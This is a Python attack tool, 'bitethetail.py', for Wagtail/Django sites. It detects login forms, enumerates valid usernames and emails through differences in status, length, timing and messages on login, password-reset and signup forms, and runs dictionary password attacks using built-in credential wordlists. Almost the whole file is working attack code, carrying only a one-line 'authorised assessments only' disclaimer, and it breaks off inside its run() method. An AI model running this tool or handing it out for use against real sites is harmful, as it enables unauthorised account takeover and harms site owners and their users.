#!/usr/bin/env python3
"""
bitethetail.py — Wagtail/Django Authentication Testing Tool

Username enumeration and dictionary password attacks against Django/Wagtail
login forms. Handles CSRF tokens, detects OIDC redirects, and performs
response differential analysis for user enumeration.

Usage:
    python bitethetail.py https://example.com
    python bitethetail.py https://example.com --mode enum
    python bitethetail.py https://example.com --mode brute -u admin -p password
    python bitethetail.py https://example.com -U users.txt -P passwords.txt

This tool is intended for authorised security assessments only.
"""

import argparse
import json
import re
import statistics
import sys
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from html.parser import HTMLParser
from urllib.parse import urljoin

try:
    import requests
    from requests.exceptions import ConnectionError, ReadTimeout, SSLError
except ImportError:
    print("Error: 'requests' is required. Install with: pip install requests")
    sys.exit(1)


# ── ANSI colours ──────────────────────────────────────────────────
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"


# ── Built-in wordlists ───────────────────────────────────────────

DEFAULT_USERNAMES = [
    "admin",
    "administrator",
    "wagtail",
    "cms",
    "editor",
    "moderator",
    "webmaster",
    "sysadmin",
    "root",
    "test",
    "testuser",
    "demo",
    "guest",
    "user",
    "staff",
    "manager",
    "superadmin",
    "developer",
    "dev",
    "staging",
    "info",
    "contact",
    "support",
    "helpdesk",
    "service",
    "noreply",
    "content",
    "publisher",
    "author",
    "reviewer",
]

DEFAULT_PASSWORDS = [
    "password",
    "Password1",
    "Password123",
    "admin",
    "Admin123",
    "Welcome1",
    "welcome1",
    "Passw0rd",
    "P@ssw0rd",
    "P@ssword1",
    "letmein",
    "changeme",
    "123456",
    "12345678",
    "qwerty",
    "dragon",
    "master",
    "monkey",
    "shadow",
    "sunshine",
    "princess",
    "football",
    "abc123",
    "111111",
    "trustno1",
    "iloveyou",
    "batman",
    "access",
    "hello",
    "1234567890",
    "password1",
    "Wagtail1",
    "wagtail",
    "Django1",
    "django",
    "Summer2025",
    "Winter2025",
    "Spring2025",
    "Autumn2025",
    "Password!",
    "Test1234",
    "Qwerty123",
    "Pa$$w0rd",
    "!QAZ2wsx",
    "Welcome123",
    "Admin@123",
    "Govuk123",
    "govuk",
    "Digital1",
    "Security1",
]

# ── Login form endpoints to probe ─────────────────────────────────

LOGIN_ENDPOINTS = [
    {
        "path": "/accounts/login/",
        "label": "Django Allauth Login",
        "username_field": "login",
        "password_field": "password",
    },
    {
        "path": "/admin/login/",
        "label": "Wagtail Admin Login",
        "username_field": "username",
        "password_field": "password",
    },
    {
        "path": "/login/",
        "label": "Frontend Login",
        "username_field": "login",
        "password_field": "password",
    },
]

ENUM_ENDPOINTS = [
    {
        "path": "/accounts/password/reset/",
        "label": "Password Reset",
        "field": "email",
        "method": "reset",
    },
    {
        "path": "/accounts/signup/",
        "label": "Signup",
        "field": "email",
        "method": "signup",
    },
]


# ── Form parser ───────────────────────────────────────────────────


class FormParser(HTMLParser):
    """Extract form fields and CSRF tokens from HTML."""

    def __init__(self):
        super().__init__()
        self.forms: list[dict] = []
        self._current_form: dict | None = None
        self.csrf_token: str = ""

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        attr_dict = dict(attrs)
        if tag == "form":
            self._current_form = {
                "action": attr_dict.get("action", ""),
                "method": attr_dict.get("method", "post").upper(),
                "fields": [],
            }
        elif tag == "input" and self._current_form is not None:
            name = attr_dict.get("name", "")
            input_type = attr_dict.get("type", "text")
            if name:
                self._current_form["fields"].append(
                    {"name": name, "type": input_type, "value": attr_dict.get("value", "")}
                )
            if name == "csrfmiddlewaretoken":
                self.csrf_token = attr_dict.get("value", "")

    def handle_endtag(self, tag: str) -> None:
        if tag == "form" and self._current_form is not None:
            self.forms.append(self._current_form)
            self._current_form = None


# ── Scanner ───────────────────────────────────────────────────────


class BiteTheTail:
    """Wagtail/Django authentication testing scanner."""

    USER_AGENT = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    )

    def __init__(
        self,
        url: str,
        threads: int = 5,
        timeout: int = 10,
        verify_ssl: bool = True,
        verbose: bool = False,
        quiet: bool = False,
        delay: float = 0.1,
        lockout_threshold: int = 5,
    ):
        self.base_url = url.rstrip("/")
        if not self.base_url.startswith(("http://", "https://")):
            self.base_url = f"https://{self.base_url}"
        self.threads = threads
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.verbose = verbose
        self.quiet = quiet
        self.delay = delay
        self.lockout_threshold = lockout_threshold
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": self.USER_AGENT})
        self._lock = threading.Lock()
        self._request_count = 0
        self._start_time = 0.0

        # Extract domain for email generation
        from urllib.parse import urlparse

        parsed = urlparse(self.base_url)
        self.target_domain = parsed.hostname or "example.com"

    # ── HTTP helpers ──────────────────────────────────────────────

    def _request(
        self,
        method: str,
        path: str,
        data: dict | None = None,
        allow_redirects: bool = False,
        headers: dict | None = None,
    ) -> requests.Response | None:
        """Send an HTTP request with error handling."""
        url = urljoin(self.base_url + "/", path.lstrip("/"))
        try:
            if self.delay > 0:
                time.sleep(self.delay)

            start = time.time()
            resp = self.session.request(
                method,
                url,
                data=data,
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=allow_redirects,
                headers=headers or {},
            )
            elapsed_ms = round((time.time() - start) * 1000, 1)

            with self._lock:
                self._request_count += 1

            if self.verbose:
                status = resp.status_code
                self._log(f"{method} {url} -> {status} ({elapsed_ms}ms)")

            resp.elapsed_ms = elapsed_ms  # type: ignore[attr-defined]
            return resp

        except (ConnectionError, ReadTimeout, SSLError) as e:
            if self.verbose:
                self._log(f"{method} {url} -> ERROR: {e}", error=True)
            return None

    def _extract_csrf(self, response: requests.Response) -> tuple[str, str]:
        """Extract CSRF token from response (cookie + form field).

        Returns (cookie_token, form_token).
        """
        # Cookie token
        cookie_token = response.cookies.get("csrftoken", "")
        if not cookie_token:
            cookie_token = self.session.cookies.get("csrftoken", "")

        # Form token from HTML
        form_token = ""
        parser = FormParser()
        try:
            parser.feed(response.text)
            form_token = parser.csrf_token
        except Exception:
            # Fallback: regex extraction
            match = re.search(
                r'name=["\']csrfmiddlewaretoken["\']\s+value=["\']([^"\']+)',
                response.text,
            )
            if match:
                form_token = match.group(1)

        return cookie_token, form_token

    def _build_domain_emails(self, usernames: list[str]) -> list[str]:
        """Generate domain-specific email addresses from usernames."""
        emails = []
        for u in ["admin", "info", "test", "editor", "webmaster", "cms", "support"]:
            emails.append(f"{u}@{self.target_domain}")
        return emails

    # ── Logging ───────────────────────────────────────────────────

    def _log(self, msg: str, error: bool = False) -> None:
        if self.quiet:
            return
        colour = RED if error else DIM
        with self._lock:
            print(f"  {colour}[*]{RESET} {msg}")

    def _print(self, msg: str) -> None:
        if self.quiet:
            return
        with self._lock:
            print(msg)

    # ── Login form detection ──────────────────────────────────────

    def detect_login_forms(self) -> list[dict]:
        """Probe known login endpoints and detect form structure."""
        results = []

        for ep in LOGIN_ENDPOINTS:
            resp = self._request("GET", ep["path"])
            if resp is None:
                results.append({
                    "path": ep["path"],
                    "label": ep["label"],
                    "status": "error",
                    "details": "connection failed",
                    "usable": False,
                })
                continue

            status = resp.status_code

            # Check for OIDC redirect
            if status in (301, 302, 307, 308):
                location = resp.headers.get("Location", "")
                is_oidc = any(
                    kw in location.lower()
                    for kw in ("oidc", "oauth", "sso", "openid", "saml")
                )
                results.append({
                    "path": ep["path"],
                    "label": ep["label"],
                    "status": "oidc_redirect" if is_oidc else "redirect",
                    "redirect": location,
                    "usable": False,
                    "details": f"redirects to {location}",
                })
                continue

            if status == 404:
                results.append({
                    "path": ep["path"],
                    "label": ep["label"],
                    "status": "not_found",
                    "usable": False,
                    "details": "404 Not Found",
                })
                continue

            if status == 200:
                # Parse form
                cookie_token, form_token = self._extract_csrf(resp)
                parser = FormParser()
                try:
                    parser.feed(resp.text)
                except Exception:
                    pass

                # Find the login form (has password field)
                login_form = None
                for form in parser.forms:
                    field_names = [f["name"] for f in form["fields"]]
                    if any(f["type"] == "password" for f in form["fields"]):
                        login_form = form
                        break

                if login_form:
                    field_names = [f["name"] for f in login_form["fields"]]
                    # Auto-detect username field name
                    username_field = ep["username_field"]
                    for candidate in ("login", "username", "email"):
                        if candidate in field_names:
                            username_field = candidate
                            break

                    results.append({
                        "path": ep["path"],
                        "label": ep["label"],
                        "status": "form_found",
                        "usable": True,
                        "username_field": username_field,
                        "password_field": ep["password_field"],
                        "csrf_cookie": cookie_token,
                        "csrf_form": form_token,
                        "fields": field_names,
                        "action": login_form["action"],
                        "details": f"fields: {', '.join(field_names)}",
                    })
                else:
                    results.append({
                        "path": ep["path"],
                        "label": ep["label"],
                        "status": "no_login_form",
                        "usable": False,
                        "details": "page exists but no login form found",
                    })
                continue

            # Other status codes
            results.append({
                "path": ep["path"],
                "label": ep["label"],
                "status": f"http_{status}",
                "usable": False,
                "details": f"HTTP {status}",
            })

        return results

    def detect_enum_endpoints(self) -> list[dict]:
        """Probe password reset and signup endpoints."""
        results = []

        for ep in ENUM_ENDPOINTS:
            resp = self._request("GET", ep["path"])
            if resp is None:
                results.append({
                    "path": ep["path"],
                    "label": ep["label"],
                    "status": "error",
                    "usable": False,
                    "method": ep["method"],
                    "details": "connection failed",
                })
                continue

            status = resp.status_code

            if status in (301, 302, 307, 308):
                location = resp.headers.get("Location", "")
                results.append({
                    "path": ep["path"],
                    "label": ep["label"],
                    "status": "redirect",
                    "usable": False,
                    "method": ep["method"],
                    "details": f"redirects to {location}",
                })
                continue

            if status == 404:
                results.append({
                    "path": ep["path"],
                    "label": ep["label"],
                    "status": "not_found",
                    "usable": False,
                    "method": ep["method"],
                    "details": "404 Not Found",
                })
                continue

            if status == 200:
                cookie_token, form_token = self._extract_csrf(resp)
                parser = FormParser()
                try:
                    parser.feed(resp.text)
                except Exception:
                    pass

                has_form = any(
                    any(f["name"] == ep["field"] for f in form["fields"])
                    for form in parser.forms
                )

                if has_form:
                    results.append({
                        "path": ep["path"],
                        "label": ep["label"],
                        "status": "form_found",
                        "usable": True,
                        "method": ep["method"],
                        "field": ep["field"],
                        "csrf_cookie": cookie_token,
                        "csrf_form": form_token,
                        "details": f"form with '{ep['field']}' field",
                    })
                else:
                    results.append({
                        "path": ep["path"],
                        "label": ep["label"],
                        "status": "no_form",
                        "usable": False,
                        "method": ep["method"],
                        "details": "page exists but expected form not found",
                    })
                continue

            results.append({
                "path": ep["path"],
                "label": ep["label"],
                "status": f"http_{status}",
                "usable": False,
                "method": ep["method"],
                "details": f"HTTP {status}",
            })

        return results

    # ── Baseline establishment ────────────────────────────────────

    def _establish_baseline(
        self,
        form_info: dict,
        field_name: str = "login",
        num_samples: int = 5,
    ) -> dict:
        """Establish baseline response for invalid usernames.

        Sends requests with random UUIDs to get baseline status, length, timing.
        """
        samples = []
        for _ in range(num_samples):
            random_user = f"nonexistent_{uuid.uuid4().hex[:12]}"

            # GET the form page for fresh CSRF
            get_resp = self._request("GET", form_info["path"])
            if get_resp is None:
                continue

            cookie_token, form_token = self._extract_csrf(get_resp)

            # Determine what data to POST
            if field_name == "email":
                # Password reset / signup
                data = {
                    "csrfmiddlewaretoken": form_token,
                    form_info.get("field", "email"): f"{random_user}@invalid-domain-test.example",
                }
            else:
                # Login form
                data = {
                    "csrfmiddlewaretoken": form_token,
                    form_info.get("username_field", "login"): random_user,
                    form_info.get("password_field", "password"): f"wrongpass_{uuid.uuid4().hex[:8]}",
                }

            start = time.time()
            post_resp = self._request("POST", form_info["path"], data=data)
            elapsed_ms = round((time.time() - start) * 1000, 1)

            if post_resp is not None:
                samples.append({
                    "status": post_resp.status_code,
                    "length": len(post_resp.content),
                    "time_ms": elapsed_ms,
                    "content_hash": hash(post_resp.text[:2000]),
                    "redirect": post_resp.headers.get("Location", ""),
                })

        if not samples:
            return {"status": 0, "length": 0, "time_ms": 0, "content_hash": 0, "redirect": ""}

        # Calculate baseline as median values
        return {
            "status": samples[0]["status"],  # Should all be the same
            "length": int(statistics.median([s["length"] for s in samples])),
            "time_ms": round(statistics.median([s["time_ms"] for s in samples]), 1),
            "time_stdev": round(
                statistics.stdev([s["time_ms"] for s in samples]) if len(samples) > 1 else 0, 1
            ),
            "content_hash": samples[0]["content_hash"],
            "redirect": samples[0]["redirect"],
            "lengths": [s["length"] for s in samples],
            "times": [s["time_ms"] for s in samples],
        }

    # ── Username enumeration ──────────────────────────────────────

    def _enum_via_login(
        self,
        username: str,
        form_info: dict,
        baseline: dict,
    ) -> dict:
        """Enumerate a username via login form differential analysis."""
        # Fresh CSRF
        get_resp = self._request("GET", form_info["path"])
        if get_resp is None:
            return {
                "username": username,
                "endpoint": form_info["path"],
                "method": "login_differential",
                "likely_valid": False,
                "evidence": "connection error",
            }

        cookie_token, form_token = self._extract_csrf(get_resp)

        data = {
            "csrfmiddlewaretoken": form_token,
            form_info.get("username_field", "login"): username,
            form_info.get("password_field", "password"): f"wrongpass_{uuid.uuid4().hex[:8]}",
        }

        start = time.time()
        post_resp = self._request("POST", form_info["path"], data=data)
        elapsed_ms = round((time.time() - start) * 1000, 1)

        if post_resp is None:
            return {
                "username": username,
                "endpoint": form_info["path"],
                "method": "login_differential",
                "likely_valid": False,
                "evidence": "connection error",
            }

        status = post_resp.status_code
        length = len(post_resp.content)
        content_hash = hash(post_resp.text[:2000])
        redirect = post_resp.headers.get("Location", "")

        # Analyse differentials
        evidence = []
        likely_valid = False

        # Status code difference
        if status != baseline["status"]:
            evidence.append(f"status {status} vs baseline {baseline['status']}")
            likely_valid = True

        # Response length difference (significant = >10% or >50 bytes)
        length_diff = abs(length - baseline["length"])
        if length_diff > max(50, baseline["length"] * 0.1):
            evidence.append(f"length {length} vs baseline {baseline['length']} (diff: {length_diff})")
            likely_valid = True

        # Timing difference (significant = >3x stdev above baseline mean)
        timing_threshold = baseline["time_ms"] + max(baseline.get("time_stdev", 50) * 3, 100)
        if elapsed_ms > timing_threshold:
            evidence.append(f"timing {elapsed_ms}ms vs baseline {baseline['time_ms']}ms")
            likely_valid = True

        # Content hash difference
        if content_hash != baseline["content_hash"] and not likely_valid:
            evidence.append("response content differs from baseline")
            likely_valid = True

        # Redirect difference
        if redirect != baseline["redirect"]:
            evidence.append(f"redirect to {redirect} vs baseline {baseline['redirect']}")
            likely_valid = True

        # Check for specific error messages that indicate valid user
        body = post_resp.text.lower()
        valid_user_indicators = [
            "this account is inactive",
            "this account has been disabled",
            "your account has been locked",
            "too many login attempts",
            "account is suspended",
            "password has expired",
        ]
        for indicator in valid_user_indicators:
            if indicator in body:
                evidence.append(f"error message: '{indicator}'")
                likely_valid = True

        return {
            "username": username,
            "endpoint": form_info["path"],
            "method": "login_differential",
            "likely_valid": likely_valid,
            "evidence": "; ".join(evidence) if evidence else "matches baseline",
            "response_status": status,
            "response_length": length,
            "response_time_ms": elapsed_ms,
            "baseline_status": baseline["status"],
            "baseline_length": baseline["length"],
            "baseline_time_ms": baseline["time_ms"],
        }

    def _enum_via_reset(
        self,
        email: str,
        endpoint: dict,
        baseline: dict,
    ) -> dict:
        """Enumerate an email via password reset differential."""
        get_resp = self._request("GET", endpoint["path"])
        if get_resp is None:
            return {
                "username": email,
                "endpoint": endpoint["path"],
                "method": "reset_differential",
                "likely_valid": False,
                "evidence": "connection error",
            }

        cookie_token, form_token = self._extract_csrf(get_resp)

        data = {
            "csrfmiddlewaretoken": form_token,
            endpoint.get("field", "email"): email,
        }

        start = time.time()
        post_resp = self._request("POST", endpoint["path"], data=data)
        elapsed_ms = round((time.time() - start) * 1000, 1)

        if post_resp is None:
            return {
                "username": email,
                "endpoint": endpoint["path"],
                "method": "reset_differential",
                "likely_valid": False,
                "evidence": "connection error",
            }

        status = post_resp.status_code
        length = len(post_resp.content)
        redirect = post_resp.headers.get("Location", "")

        evidence = []
        likely_valid = False

        if status != baseline["status"]:
            evidence.append(f"status {status} vs baseline {baseline['status']}")
            likely_valid = True

        length_diff = abs(length - baseline["length"])
        if length_diff > max(50, baseline["length"] * 0.1):
            evidence.append(f"length {length} vs baseline {baseline['length']} (diff: {length_diff})")
            likely_valid = True

        timing_threshold = baseline["time_ms"] + max(baseline.get("time_stdev", 50) * 3, 200)
        if elapsed_ms > timing_threshold:
            evidence.append(f"timing {elapsed_ms}ms vs baseline {baseline['time_ms']}ms")
            likely_valid = True

        if redirect != baseline["redirect"]:
            evidence.append(f"redirect to {redirect} vs baseline {baseline['redirect']}")
            likely_valid = True

        return {
            "username": email,
            "endpoint": endpoint["path"],
            "method": "reset_differential",
            "likely_valid": likely_valid,
            "evidence": "; ".join(evidence) if evidence else "matches baseline",
            "response_status": status,
            "response_length": length,
            "response_time_ms": elapsed_ms,
            "baseline_status": baseline["status"],
            "baseline_length": baseline["length"],
            "baseline_time_ms": baseline["time_ms"],
        }

    def _enum_via_signup(
        self,
        email: str,
        endpoint: dict,
        baseline: dict,
    ) -> dict:
        """Enumerate an email via signup form differential."""
        get_resp = self._request("GET", endpoint["path"])
        if get_resp is None:
            return {
                "username": email,
                "endpoint": endpoint["path"],
                "method": "signup_differential",
                "likely_valid": False,
                "evidence": "connection error",
            }

        cookie_token, form_token = self._extract_csrf(get_resp)

        # Signup typically needs email + password
        random_pass = f"T3stP@ss_{uuid.uuid4().hex[:8]}"
        data = {
            "csrfmiddlewaretoken": form_token,
            "email": email,
            "password1": random_pass,
            "password2": random_pass,
        }

        start = time.time()
        post_resp = self._request("POST", endpoint["path"], data=data)
        elapsed_ms = round((time.time() - start) * 1000, 1)

        if post_resp is None:
            return {
                "username": email,
                "endpoint": endpoint["path"],
                "method": "signup_differential",
                "likely_valid": False,
                "evidence": "connection error",
            }

        status = post_resp.status_code
        length = len(post_resp.content)
        body = post_resp.text.lower()

        evidence = []
        likely_valid = False

        # Check for explicit "already registered" messages
        registered_indicators = [
            "already registered",
            "already exists",
            "already in use",
            "email is taken",
            "user with this email",
            "account already exists",
        ]
        for indicator in registered_indicators:
            if indicator in body:
                evidence.append(f"signup message: '{indicator}'")
                likely_valid = True

        if status != baseline["status"]:
            evidence.append(f"status {status} vs baseline {baseline['status']}")

        length_diff = abs(length - baseline["length"])
        if length_diff > max(50, baseline["length"] * 0.1):
            evidence.append(f"length {length} vs baseline {baseline['length']} (diff: {length_diff})")

        return {
            "username": email,
            "endpoint": endpoint["path"],
            "method": "signup_differential",
            "likely_valid": likely_valid,
            "evidence": "; ".join(evidence) if evidence else "matches baseline",
            "response_status": status,
            "response_length": length,
            "response_time_ms": elapsed_ms,
            "baseline_status": baseline["status"],
            "baseline_length": baseline["length"],
            "baseline_time_ms": baseline["time_ms"],
        }

    def enumerate_users(
        self,
        usernames: list[str],
        login_forms: list[dict],
        enum_endpoints: list[dict],
    ) -> list[dict]:
        """Run username enumeration across all usable endpoints."""
        results = []

        # Enumeration via login forms
        usable_logins = [f for f in login_forms if f.get("usable")]
        for form_info in usable_logins:
            self._print(f"\n  {BOLD}Testing {len(usernames)} usernames against {form_info['path']}{RESET}")
            self._print(f"  {DIM}Establishing baseline...{RESET}")

            baseline = self._establish_baseline(form_info, field_name="login")
            if baseline["status"] == 0:
                self._print(f"  {RED}Failed to establish baseline{RESET}")
                continue

            self._print(
                f"  {DIM}Baseline: status={baseline['status']} "
                f"length={baseline['length']} "
                f"time={baseline['time_ms']}ms "
                f"(stdev={baseline.get('time_stdev', 0)}ms){RESET}"
            )

            for username in usernames:
                result = self._enum_via_login(username, form_info, baseline)
                results.append(result)

                if result["likely_valid"]:
                    self._print(
                        f"  {GREEN}[!]{RESET} {BOLD}{username:<30}{RESET} "
                        f"{GREEN}LIKELY VALID{RESET}   ({result['evidence']})"
                    )
                elif self.verbose:
                    self._print(
                        f"  {DIM}[-] {username:<30} NOT FOUND      (matches baseline){RESET}"
                    )

        # Enumeration via password reset
        usable_resets = [e for e in enum_endpoints if e.get("usable") and e["method"] == "reset"]
        emails = [u for u in usernames if "@" in u]
        # Generate domain emails for non-email usernames
        emails += [f"{u}@{self.target_domain}" for u in usernames if "@" not in u]

        for ep in usable_resets:
            self._print(f"\n  {BOLD}Testing {len(emails)} emails via {ep['path']}{RESET}")
            self._print(f"  {DIM}Establishing baseline...{RESET}")

            baseline = self._establish_baseline(ep, field_name="email")
            if baseline["status"] == 0:
                self._print(f"  {RED}Failed to establish baseline{RESET}")
                continue

            self._print(
                f"  {DIM}Baseline: status={baseline['status']} "
                f"length={baseline['length']} "
                f"time={baseline['time_ms']}ms{RESET}"
            )

            for email in emails:
                result = self._enum_via_reset(email, ep, baseline)
                results.append(result)

                if result["likely_valid"]:
                    self._print(
                        f"  {GREEN}[!]{RESET} {BOLD}{email:<30}{RESET} "
                        f"{GREEN}LIKELY VALID{RESET}   ({result['evidence']})"
                    )
                elif self.verbose:
                    self._print(
                        f"  {DIM}[-] {email:<30} NOT FOUND      (matches baseline){RESET}"
                    )

        # Enumeration via signup
        usable_signups = [e for e in enum_endpoints if e.get("usable") and e["method"] == "signup"]
        for ep in usable_signups:
            self._print(f"\n  {BOLD}Testing {len(emails)} emails via {ep['path']}{RESET}")
            self._print(f"  {DIM}Establishing baseline...{RESET}")

            baseline = self._establish_baseline(ep, field_name="email")
            if baseline["status"] == 0:
                self._print(f"  {RED}Failed to establish baseline{RESET}")
                continue

            self._print(
                f"  {DIM}Baseline: status={baseline['status']} "
                f"length={baseline['length']} "
                f"time={baseline['time_ms']}ms{RESET}"
            )

            for email in emails:
                result = self._enum_via_signup(email, ep, baseline)
                results.append(result)

                if result["likely_valid"]:
                    self._print(
                        f"  {GREEN}[!]{RESET} {BOLD}{email:<30}{RESET} "
                        f"{GREEN}LIKELY VALID{RESET}   ({result['evidence']})"
                    )
                elif self.verbose:
                    self._print(
                        f"  {DIM}[-] {email:<30} NOT FOUND      (matches baseline){RESET}"
                    )

        return results

    # ── Brute force ───────────────────────────────────────────────

    def _try_login(
        self,
        username: str,
        password: str,
        form_info: dict,
    ) -> dict:
        """Attempt a single login with CSRF handling."""
        # Fresh session for each attempt to get clean CSRF
        get_resp = self._request("GET", form_info["path"])
        if get_resp is None:
            return {
                "username": username,
                "password": password,
                "success": False,
                "endpoint": form_info["path"],
                "evidence": "connection error",
            }

        cookie_token, form_token = self._extract_csrf(get_resp)

        data = {
            "csrfmiddlewaretoken": form_token,
            form_info.get("username_field", "login"): username,
            form_info.get("password_field", "password"): password,
        }

        start = time.time()
        post_resp = self._request("POST", form_info["path"], data=data)
        elapsed_ms = round((time.time() - start) * 1000, 1)

        if post_resp is None:
            return {
                "username": username,
                "password": password,
                "success": False,
                "endpoint": form_info["path"],
                "evidence": "connection error",
            }

        status = post_resp.status_code
        redirect = post_resp.headers.get("Location", "")
        body = post_resp.text.lower()

        # Check for success indicators
        success = False
        evidence = ""

        # 302 redirect to profile/dashboard/admin is a strong success indicator
        if status in (301, 302, 307, 308):
            success_redirects = [
                "/accounts/profile/",
                "/admin/",
                "/dashboard/",
                "/",
            ]
            # Login failures also redirect back to the login page
            failure_redirects = [
                "/accounts/login/",
                "/admin/login/",
                "/login/",
            ]
            if redirect and not any(fr in redirect for fr in failure_redirects):
                success = True
                evidence = f"redirect to {redirect}"
            elif redirect and any(sr in redirect for sr in success_redirects):
                success = True
                evidence = f"redirect to {redirect}"

        # Check for session cookie change
        if "sessionid" in self.session.cookies:
            if not success:
                success = True
                evidence = "new session cookie set"

        # Check for absence of common error messages
        if status == 200:
            error_indicators = [
                "incorrect",
                "invalid",
                "wrong password",
                "login failed",
                "not correct",
                "please try again",
                "authentication failed",
            ]
            has_error = any(ind in body for ind in error_indicators)
            if not has_error and "login" not in post_resp.url.lower():
                # 200 without error on a non-login page could mean success
                pass

        return {
            "username": username,
            "password": password,
            "success": success,
            "endpoint": form_info["path"],
            "evidence": evidence or f"HTTP {status}",
            "response_status": status,
            "response_time_ms": elapsed_ms,
            "redirect": redirect,
        }

    def brute_force(
        self,
        usernames: list[str],
        passwords: list[str],
        login_forms: list[dict],
    ) -> tuple[list[dict], list[dict]]:
        """Run dictionary password attack.

        Returns (results, lockouts).
        """
        results = []
        lockouts = []

        usable_logins = [f for f in login_forms if f.get("usable")]
        if not usable_logins:
            self._print(f"  {RED}No usable login forms found{RESET}")
            return results, lockouts

        total_attempts = len(usernames) * len(passwords) * len(usable_logins)
        self._print(
            f"\n  {BOLD}Targeting {len(usernames)} user(s) with "
            f"{len(passwords)} password(s) ({total_attempts} attempts){RESET}"
        )

        for form_info in usable_logins:
            self._print(f"  {DIM}Endpoint: {form_info['path']}{RESET}")

            for username in usernames:
                consecutive_failures = 0
                locked_out = False

                for password in passwords:
                    if locked_out:
                        break

                    result = self._try_login(username, password, form_info)
                    results.append(result)

                    if result["success"]:
                        self._print(
                            f"  {GREEN}{BOLD}[!!!] {username} : {password}{RESET}"
                            f"        {GREEN}SUCCESS ({result['evidence']}){RESET}"
                        )
                        break  # Found valid creds, stop for this user
                    else:
                        consecutive_failures += 1

                        if self.verbose:
                            self._print(
                                f"  {DIM}[---] {username} : {password:<20} "
                                f"FAILED ({result['evidence']}){RESET}"
                            )

                        # Lockout detection
                        if consecutive_failures >= self.lockout_threshold:
                            # Check if response pattern changed (rate limit / lockout)
                            recent = results[-self.lockout_threshold:]
                            statuses = {r["response_status"] for r in recent if "response_status" in r}
                            if 429 in statuses:
                                locked_out = True
                                lockout_info = {
                                    "username": username,
                                    "endpoint": form_info["path"],
                                    "attempts_before_lockout": consecutive_failures,
                                    "evidence": "HTTP 429 Too Many Requests",
                                }
                                lockouts.append(lockout_info)
                                self._print(
                                    f"  {YELLOW}[***] {username:<30} "
                                    f"LOCKOUT DETECTED (429 rate limit){RESET}"
                                )

                        # Also check if we hit lockout threshold with no 429
                        # but responses changed pattern
                        if (
                            consecutive_failures == self.lockout_threshold
                            and not locked_out
                            and len(results) >= self.lockout_threshold
                        ):
                            recent = results[-self.lockout_threshold:]
                            lengths = [
                                r.get("response_length", r.get("response_status", 0))
                                for r in recent
                                if "response_status" in r
                            ]
                            # If last response differs significantly from first few
                            if len(set(r.get("response_status", 0) for r in recent)) > 1:
                                locked_out = True
                                lockout_info = {
                                    "username": username,
                                    "endpoint": form_info["path"],
                                    "attempts_before_lockout": consecutive_failures,
                                    "evidence": "response pattern changed after threshold",
                                }
                                lockouts.append(lockout_info)
                                self._print(
                                    f"  {YELLOW}[***] {username:<30} "
                                    f"POSSIBLE LOCKOUT (response pattern changed){RESET}"
                                )

        return results, lockouts

    # ── Orchestration ─────────────────────────────────────────────

    def run(
        self,
        mode: str = "all",
        usernames: list[str] | None = None,
        passwords: list[str] | None = None,
    ) -> dict:
        """Run the full scan."""
        self._start_time = time.time()

        if usernames is None:
            usernames = list(DEFAULT_USERNAMES)
        if passwords is None:
            passwords = list(DEFAULT_PASSWORDS)

        results = {
            "target": self.base_url,
            "mode": mode,
            "login_forms": [],
            "enum_endpoints": [],
            "enumeration_results": [],
            "brute_results": [],
            "lockouts": [],
            "credentials_found": [],
            "valid_usernames": [],
            "summary": {},
        }

        # Phase 1: Detect login forms
        self._print(f"\n  {BOLD}{MAGENTA}LOGIN FORM DETECTION{RESET}")
        self._print(f"  {DIM}{'─' * 60}{RESET}")

        login_forms = self.detect_login_forms()
        results["login_forms"] = login_forms

        for form in login_forms:
            if form.get("usable"):
                self._print(
                    f"  {GREEN}[+]{RESET} {form['path']:<35} "
                    f"{GREEN}FORM FOUND{RESET}    ({form['details']})"
                )
            elif form["status"] == "oidc_redirect":
                self._print(
                    f"  {CYAN}[~]{RESET} {form['path']:<35} "
                    f"{CYAN}OIDC REDIRECT{RESET} ({form['details']})"
                )
            elif form["status"] == "redirect":
                self._print(
                    f"  {CYAN}[~]{RESET} {form['path']:<35} "
                    f"{CYAN}REDIRECT{RESET}      ({form['details']})"
                )
            elif form["status"] == "not_found":
                self._print(
                    f"  {DIM}[-] {form['path']:<35} NOT FOUND{RESET}"
                )
            else:
                self._print(
                    f"  {DIM}[-] {form['path']:<35} {form['details']}{RESET}"
                )

        # Detect enumeration endpoints
        enum_endpoints = self.detect_enum_endpoints()
        results["enum_endpoints"] = enum_endpoints

        for ep in enum_endpoints:
            if ep.get("usable"):
                self._print(
                    f"  {GREEN}[+]{RESET} {ep['path']:<35} "
                    f"{GREEN}FORM FOUND{RESET}    ({ep['details']})"
                )
            elif ep["status"] == "not_found":
                self._print(
                    f"  {DIM}[-] {ep['path']:<35} NOT FOUND{RESET}"
                )
            else:
                self._print(
                    f"  {DIM}[-] {ep['path']:<35} {ep['details']}{RESET}"
                )

        # Phase 2: Username enumeration
        if mode in ("all", "enum"):
            self._print(f"\n  {BOLD}{MAGENTA}USERNAME ENUMERATION{RESET}")
            self._print(f"  {DIM}{'─' * 60}{RESET}")

            enum_results = self.enumerate_users(usernames, login_forms, enum_endpoints)
            results["enumeration_results"] = enum_results

            valid = list({r["username"] for r in enum_results if r["likely_valid"]})
            results["valid_usernames"] = valid

            if valid:
                self._print(f"\n  {GREEN}{BOLD}VALID USERNAMES: {', '.join(valid)}{RESET}")
            else:
                self._print(f"\n  {DIM}No valid usernames identified via differential analysis{RESET}")

        # Phase 3: Brute force
        if mode in ("all", "brute"):
            self._print(f"\n  {BOLD}{MAGENTA}PASSWORD ATTACK{RESET}")
            self._print(f"  {DIM}{'─' * 60}{RESET}")

            # In 'all' mode, only brute-force valid usernames found during enum
            brute_targets = usernames
            if mode == "all" and results.get("valid_usernames"):
                brute_targets = results["valid_usernames"]
                self._print(
                    f"  {DIM}Smart mode: targeting {len(brute_targets)} "
                    f"enumerated user(s){RESET}"
                )
